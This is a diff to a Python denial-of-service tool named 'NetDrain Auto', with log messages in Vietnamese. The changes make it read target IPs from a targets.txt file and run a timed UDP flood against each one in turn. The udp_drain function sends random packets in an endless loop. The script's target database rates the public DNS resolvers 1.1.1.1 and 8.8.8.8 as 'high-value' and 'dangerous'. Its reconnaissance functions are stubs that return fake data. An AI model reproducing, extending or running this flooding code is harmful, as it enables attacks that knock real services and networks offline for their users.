@@ -5,58 +5,41 @@ import time
 import sys
 from datetime import datetime
 
+def log(msg):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+
 def get_target_info(ip):
-    print(f"[i] Fetching data for {ip}...")
+    log(f"[i] Fetching data for {ip}...")
     return {"os": "unknown", "isp": "fake-isp", "location": "unknown"}
 
 def scan_ports(ip):
-    print(f"[i] Scanning open ports on {ip}...")
+    log(f"[i] Scanning open ports on {ip}...")
     return [22, 80, 443]
 
 def resolve_dns(domain):
-    print(f"[i] Resolving DNS for {domain}...")
+    log(f"[i] Resolving DNS for {domain}...")
     return "127.0.0.1"
 
 def detect_os(ip):
-    print(f"[i] Attempting OS detection on {ip}...")
+    log(f"[i] Attempting OS detection on {ip}...")
     return "Linux"
 
 def geoip_lookup(ip):
-    print(f"[i] Getting geoIP info for {ip}...")
+    log(f"[i] Getting geoIP info for {ip}...")
     return {"country": "Unknown", "city": "Nowhere"}
 
-class PayloadBuilder:
-    def __init__(self):
-        self.payloads = []
-    def add(self, p): 
-        self.payloads.append(p)
-    def build(self): 
-        return b"".join(self.payloads)
-
-config = {
-    "attack_mode": "stealth",
-    "retries": 5,
-    "proxy": None,
-    "timeout": 10,
-    "max_payload": 4096
-}
-
-attack_profiles = [
-    {"name": "basic_flood", "rate": "max", "method": "udp"},
-    {"name": "slow_drain", "rate": "low", "method": "tcp"}
-]
-
-ip_list = [
-    "192.168.1.1", "10.0.0.1", "8.8.8.8", "1.1.1.1"
-]
+def load_ip_list_from_file(path="targets.txt"):
+    try:
+        with open(path, "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    except FileNotFoundError:
+        log(f"[!] File '{path}' not found.")
+        return []
 
 target_database = {
     "1.1.1.1": {"status": "online", "rating": "high-value"},
     "8.8.8.8": {"status": "protected", "rating": "dangerous"}
 }
-
-def log(msg):
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
 
 def udp_drain(ip, port, packet_size):
     data = random._urandom(packet_size)
@@ -64,7 +47,6 @@ def udp_drain(ip, port, packet_size):
     while True:
         try:
             s.sendto(data, (ip, port))
-            power = socket.socket(1000)
         except:
             pass
 
@@ -98,11 +80,11 @@ def start_attack(ip, port, method, duration, rq):
         remaining = int(end_time - time.time())
         log(f"[~] Attack in progress... {remaining} seconds remaining.")
         time.sleep(5)
-    log("[✓] Attack time is over. Exiting...")
+    log("[✓] Attack time is over.")
 
 def auto_mode():
     print("=== NetDrain Auto Mode ===")
-    print(r"""
+    print("""
    ____             _       _         _          
   |  _ \  __ _ _ __(_) __ _| |__  ___| |_ _   _  
   | | | |/ _` | '__| |/ _` | '_ \/ __| __| | | | 
@@ -112,7 +94,11 @@ def auto_mode():
         NetDrain Auto v2.0 by Ngzz Dat
     """)
     
-    log("[✓] Auto mode khởi động thành công. Bắt đầu quá trình xử lý mục tiêu...\n")
+    # Tải danh sách IP từ file
+    ip_list = load_ip_list_from_file("targets.txt")
+    if not ip_list:
+        log("[!] Không có IP để tấn công. Kiểm tra lại targets.txt")
+        sys.exit(1)
 
     default_port = 80
     default_method = "udp"
@@ -120,7 +106,7 @@ def auto_mode():
     default_threads = 10
 
     for ip in ip_list:
-        log(f"[*] Bắt đầu kiểm tra mục tiêu {ip}")
+        log(f"[*] Đang kiểm tra mục tiêu {ip}")
         get_target_info(ip)
         scan_ports(ip)
         resolve_dns(ip)
@@ -129,11 +115,13 @@ def auto_mode():
 
         if ip in target_database:
             info = target_database[ip]
-            log(f"[i] Tìm thấy trong database - Trạng thái: {info['status']}, Độ ưu tiên: {info['rating']}")
+            log(f"[i] Được tìm thấy trong database - Trạng thái: {info['status']}, Độ ưu tiên: {info['rating']}")
 
         start_attack(ip, default_port, default_method, default_duration, default_threads)
         log(f"[✓] Hoàn tất với {ip}. Nghỉ trước khi tiếp tục...\n")
         time.sleep(5)
+
+    log("[✔️] Tất cả mục tiêu đã xử lý thành công.")
 
 if __name__ == "__main__":
     auto_mode()
